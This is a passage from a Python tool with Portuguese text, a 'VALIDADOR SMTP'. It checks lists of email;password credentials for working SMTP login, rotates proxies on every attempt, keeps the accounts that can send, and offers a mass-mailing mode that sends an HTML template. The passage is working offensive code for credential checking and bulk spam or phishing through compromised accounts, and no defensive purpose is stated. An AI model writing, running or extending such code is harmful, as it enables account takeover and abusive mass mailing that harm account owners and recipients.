        print(f"{Colors.RED}❌ Nenhuma credencial encontrada!{Colors.RESET}")
        return
    
    stats['total'] = len(credentials)
    print(f"{Colors.GREEN}✅ {stats['total']} credenciais carregadas{Colors.RESET}")
    
    # Remove arquivos anteriores
    for fname in ['smtp_validos.txt', 'smtp_envio.txt']:
        if os.path.exists(fname):
            os.remove(fname)
    
    print(f"\n{Colors.CYAN}🚀 Iniciando validação...{Colors.RESET}")
    print("="*80 + "\n")
    
    start_time = time.time()
    
    # Resetar stats
    stats['valid_login'] = 0
    stats['valid_send'] = 0
    stats['invalid'] = 0
    stats['processed'] = 0
    
    # Fila
    queue = Queue()
    for cred in credentials:
        queue.put(cred)
    for _ in range(MAX_WORKERS):
        queue.put(None)
    
    # Threads
    threads = []
    for i in range(MAX_WORKERS):
        t = Thread(target=worker_thread, args=(i + 1, queue))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    elapsed = time.time() - start_time
    
    # Relatório
    print("\n\n" + "="*80)
    print(f"{Colors.BOLD}{Colors.GREEN}📊 RELATÓRIO FINAL{Colors.RESET}")
    print("="*80)
    print(f"{Colors.GREEN}🔐 Login OK: {stats['valid_login']}{Colors.RESET}")
    print(f"{Colors.BLUE}📧 Envio OK: {stats['valid_send']}{Colors.RESET}")
    print(f"{Colors.RED}❌ Inválidos: {stats['invalid']}{Colors.RESET}")
    print(f"\n{Colors.YELLOW}⏱️  Tempo: {elapsed:.2f}s{Colors.RESET}")
    print("="*80 + "\n")

# ============================================================================
# FUNÇÃO DE TESTE COMPLETO (OPÇÃO 3)
# ============================================================================

def testar_todos_smtps():
    """Testa TODOS os SMTPs e remove os com erro"""
    print("\n" + "="*80)
    print(f"{Colors.BOLD}{Colors.CYAN}📧 TESTE COMPLETO DE TODOS OS SMTPs{Colors.RESET}")
    print("="*80)
    
    if not carregar_proxies():
        return
    
    # Verificar arquivos necessários
    if not os.path.exists(ARQUIVO_SMTPS_ENVIO):
        print(f"\n{Colors.RED}❌ Arquivo '{ARQUIVO_SMTPS_ENVIO}' não encontrado!{Colors.RESET}")
        return
    
    if not os.path.exists(ARQUIVO_HTML):
        print(f"\n{Colors.RED}❌ Arquivo '{ARQUIVO_HTML}' não encontrado!{Colors.RESET}")
        return
    
    # Ler SMTPs
    smtps = []
    with open(ARQUIVO_SMTPS_ENVIO, 'r', encoding='utf-8') as f:
        for linha in f:
            linha = linha.strip()
            if linha and not linha.startswith('#'):
                smtps.append(linha)
    
    # Ler HTML
    with open(ARQUIVO_HTML, 'r', encoding='utf-8') as f:
        html_content = f.read()
    
    if not smtps:
        print(f"\n{Colors.RED}❌ Nenhum SMTP encontrado!{Colors.RESET}")
        return
    
    # Solicitar email de teste
    email_teste = input(f"\n{Colors.YELLOW}✉️  Digite o email para receber os testes: {Colors.RESET}").strip()
    
    if not email_teste or '@' not in email_teste:
        print(f"\n{Colors.RED}❌ Email inválido!{Colors.RESET}")
        return
    
    print(f"\n{Colors.CYAN}📋 Configurações:{Colors.RESET}")
    print(f"   - SMTPs para testar: {len(smtps)}")
    print(f"   - Email de teste: {email_teste}")
    
    print("\n" + "="*80)
    print(f"{Colors.YELLOW}🚀 Iniciando teste de TODOS os SMTPs...{Colors.RESET}\n")
    
    smtps_validos = []
    smtps_invalidos = []
    contador = 0
    
    for smtp_data in smtps:
        contador += 1
        
        try:
            # Parse SMTP
            partes = smtp_data.strip().split(';')
            servidor_porta = partes[0].split(':')
            servidor = servidor_porta[0]
            porta = int(servidor_porta[1]) if len(servidor_porta) > 1 else 587
            usuario = partes[1]
            senha = partes[2]
            
            # Pega novo proxy para cada teste
            proxy = obter_proximo_proxy()
            if not proxy:
                print(f"{Colors.RED}❌ Sem proxies disponíveis!{Colors.RESET}")
                break
            
            print(f"{Colors.CYAN}[{contador}/{len(smtps)}] Testando: {usuario[:40]}...{Colors.RESET}")
            
            # Tenta enviar email de teste
            sucesso, msg, is_error, ip_usado = enviar_email_massa(
                servidor, porta, usuario, senha,
                email_teste, html_content, FROM_NAME, 
                f"TESTE SMTP - {usuario}", proxy, max_tentativas=2
            )
            
            if sucesso:
                smtps_validos.append(smtp_data)
                print(f"{Colors.GREEN}✓ SMTP OK: {usuario[:40]}{Colors.RESET}")
            else:
                smtps_invalidos.append(smtp_data)
                print(f"{Colors.RED}✗ SMTP com ERRO: {usuario[:40]} - {msg[:50]}{Colors.RESET}")
                marcar_smtp_erro(smtp_data)
            
            time.sleep(1)  # Delay entre testes
        
        except Exception as e:
            smtps_invalidos.append(smtp_data)
            print(f"{Colors.RED}✗ ERRO ao testar: {smtp_data[:50]} - {str(e)[:50]}{Colors.RESET}")
            marcar_smtp_erro(smtp_data)
    
    # Atualizar arquivo de SMTPs válidos
    with open(ARQUIVO_SMTPS_ENVIO, 'w', encoding='utf-8') as f:
        for smtp in smtps_validos:
            f.write(smtp + '\n')
    
    # Relatório
    print("\n" + "="*80)
    print(f"{Colors.BOLD}{Colors.GREEN}📊 RELATÓRIO FINAL - TESTE COMPLETO{Colors.RESET}")
    print("="*80)
    print(f"{Colors.GREEN}✓ SMTPs válidos: {len(smtps_validos)}{Colors.RESET}")
    print(f"{Colors.RED}✗ SMTPs com erro: {len(smtps_invalidos)}{Colors.RESET}")
    print(f"\n{Colors.CYAN}📁 Arquivos atualizados:{Colors.RESET}")
    print(f"   - {ARQUIVO_SMTPS_ENVIO} (apenas SMTPs válidos)")
    if smtps_invalidos:
        print(f"   - {ARQUIVO_SMTP_ERRO} (SMTPs com erro)")
    print(f"\n{Colors.YELLOW}📬 Verifique {email_teste} para os emails de teste!{Colors.RESET}")
    print("="*80 + "\n")

# ============================================================================
# MENU PRINCIPAL
# ============================================================================

def menu():
    """Menu principal do sistema"""
    
    while True:
        print("\n" + "="*80)
        print(f"{Colors.BOLD}{Colors.CYAN}🔐 VALIDADOR SMTP v3.13 - CORRIGIDO{Colors.RESET}")
        print("="*80)
        print(f"{Colors.YELLOW}Escolha uma opção:{Colors.RESET}\n")
        print(f"{Colors.GREEN}1{Colors.RESET} - Validar SMTPs (email;senha)")
        print(f"{Colors.GREEN}2{Colors.RESET} - Enviar Lista de Emails (Modo Massa)")
        print(f"{Colors.MAGENTA}3{Colors.RESET} - Testar TODOS os SMTPs (Remove erros)")
        print(f"{Colors.RED}0{Colors.RESET} - Sair")
        print("\n" + "="*80)
        
        opcao = input(f"\n{Colors.CYAN}Digite sua opção: {Colors.RESET}").strip()
        
        if opcao == '1':
            validar_smtps()
        elif opcao == '2':
            enviar_lista_emails()
        elif opcao == '3':
            testar_todos_smtps()
        elif opcao == '0':
            print(f"\n{Colors.GREEN}👋 Até logo!{Colors.RESET}\n")
            break
        else:
            print(f"\n{Colors.RED}❌ Opção inválida!{Colors.RESET}")

if __name__ == "__main__":
    menu()